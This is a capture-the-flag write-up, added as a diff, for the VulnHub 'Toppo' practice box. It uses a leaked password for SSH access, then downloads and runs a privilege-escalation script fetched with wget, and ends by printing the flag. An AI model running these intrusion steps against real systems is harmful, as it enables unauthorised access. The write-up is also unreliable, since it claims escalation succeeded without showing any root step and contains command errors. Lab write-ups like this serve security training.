@@ -1,0 +1,62 @@
+______________________________________________________________________________________________________________________________________________________________________
+This is simple Linux Privilege Escalation
+Link for the box : https://www.vulnhub.com/entry/toppo-1,245 
+______________________________________________________________________________________________________________________________________________________________________
+
+1. arp-scan --local #This command will show the IP of the devices that are connect to my network.
+192.168.XX.XXX #Your IP will be different.
+
+2. gobuster dir 192.168.XX.XXX -w /usr/share/wordlists/dirb/common.txt #This command will find the hidden directory
+#On the http://192.168.XX.XXX/admin/notes.txt, I found :
+Note to myself :
+I need to change my password :/ 12345ted123 is too outdated but the technology isn't my thing i prefer go fishing or watching soccer .
+
+3. Namp command was fired up : nmap -SV -sS -A -T4 192.168.XX.XXX 
+As ssh port was opened and also we have the username and password. 
+ 22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 #we also have the username and password 
+Username :ted 
+password : 12345ted123
+
+4. ssh ted@192.168.76.134  #This command helps to access the ssh service. 
+ted@Toppo:~$   #We have login as ted. #This is only the user account. 
+
+5.ted@Toppo:~$ whoami
+ted
+
+6.  ted@Toppo:~$ uname -a #To see the information about the box.
+Linux Toppo 3.16.0-4-586 #1 Debian 3.16.51-3 (2017-12-13) i686 GNU/Linux
+
+7. ted@Toppo:~$ gcc
+-bash: gcc: command not found  #To compile the 'C' code but we dont have gcc in this box.
+
+8. ted@Toppo:~$ wget 
+wget: missing URL
+Usage: wget [OPTION]... [URL]...
+
+Try `wget --help' for more options. #As we can see wget is enable.
+
+9. https://github.com/mzet-/linux-exploit-suggester #Linux Privilege Escalation
+10. As ssh allows to use wget paste "wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh"
+11. ted@Toppo:~$ ls
+  les.sh #As we can see we have sucessfully Escalated Privilege
+ted@Toppo:~$ chmod +x les.sh #Lets give full permission.
+12. ted@Toppo:~$ ./les.sh #Since its a bash script ./ will execute the script.
+13.  ted@Toppo:/$ python -c 'import pty; pty.spawn("/bin/sh")'#Spawning tty shell
+15. find  | grep flag #This commmand will find flag for us. 
+16 We have found the flag. 
+_________                                  
+|  _   _  |                                 
+|_/ | | \_|.--.   _ .--.   _ .--.    .--.   
+    | |  / .'`\ \[ '/'`\ \[ '/'`\ \/ .'`\ \ 
+   _| |_ | \__. | | \__/ | | \__/ || \__. | 
+  |_____| '.__.'  | ;.__/  | ;.__/  '.__.'  
+                 [__|     [__|              
+
+
+
+
+Congratulations ! there is your flag : 0wnedlab{p4ssi0n_c0me_with_pract1ce}
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+										@SumedhDawadi
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
